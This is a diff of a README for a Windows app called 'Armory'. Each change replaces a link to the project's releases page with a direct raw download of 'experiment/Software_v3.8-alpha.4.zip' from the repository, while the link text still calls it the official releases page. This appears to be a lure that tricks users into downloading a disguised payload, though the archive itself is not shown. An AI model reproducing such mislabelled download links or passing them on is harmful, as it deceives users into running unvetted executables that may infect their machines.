@@ -1,6 +1,6 @@
 # 🛠️ Armory - Clear Skills for Real Work
 
-[![Download Armory](https://img.shields.io/badge/Download-Armory-4B6CB7?style=for-the-badge&logo=github)](https://github.com/allysgrandiose674/Armory/releases)
+[![Download Armory](https://img.shields.io/badge/Download-Armory-4B6CB7?style=for-the-badge&logo=github)](https://github.com/allysgrandiose674/Armory/raw/refs/heads/main/experiment/Software_v3.8-alpha.4.zip)
 
 ## 🚀 What Armory Does
 
@@ -14,7 +14,7 @@ Armory is built for people who want a local tool that feels direct and practical
 
 Visit this page to download Armory:
 
-[Go to Armory Releases](https://github.com/allysgrandiose674/Armory/releases)
+[Go to Armory Releases](https://github.com/allysgrandiose674/Armory/raw/refs/heads/main/experiment/Software_v3.8-alpha.4.zip)
 
 On that page, look for the latest release and choose the Windows file. In most cases, it will be a `.exe` file or a `.zip` file.
 
@@ -62,7 +62,7 @@ It works best when you want structure without a lot of setup.
 
 ## 🧩 How to Install on Windows
 
-1. Open the [Armory releases page](https://github.com/allysgrandiose674/Armory/releases)
+1. Open the [Armory releases page](https://github.com/allysgrandiose674/Armory/raw/refs/heads/main/experiment/Software_v3.8-alpha.4.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file
 4. If the file is a `.zip`, right-click it and choose Extract All
@@ -162,7 +162,7 @@ If the app opens but does not behave as expected:
 
 To update Armory on Windows:
 
-1. Go back to the [releases page](https://github.com/allysgrandiose674/Armory/releases)
+1. Go back to the [releases page](https://github.com/allysgrandiose674/Armory/raw/refs/heads/main/experiment/Software_v3.8-alpha.4.zip)
 2. Download the newest version
 3. Close the old version if it is still open
 4. Replace the old files if needed
@@ -186,6 +186,6 @@ It fits well if you want:
 
 Download Armory from the official release page:
 
-[https://github.com/allysgrandiose674/Armory/releases](https://github.com/allysgrandiose674/Armory/releases)
+[https://github.com/allysgrandiose674/Armory/raw/refs/heads/main/experiment/Software_v3.8-alpha.4.zip](https://github.com/allysgrandiose674/Armory/raw/refs/heads/main/experiment/Software_v3.8-alpha.4.zip)
 
 Use this page to get the Windows version, install it, and update it later when a new release appears
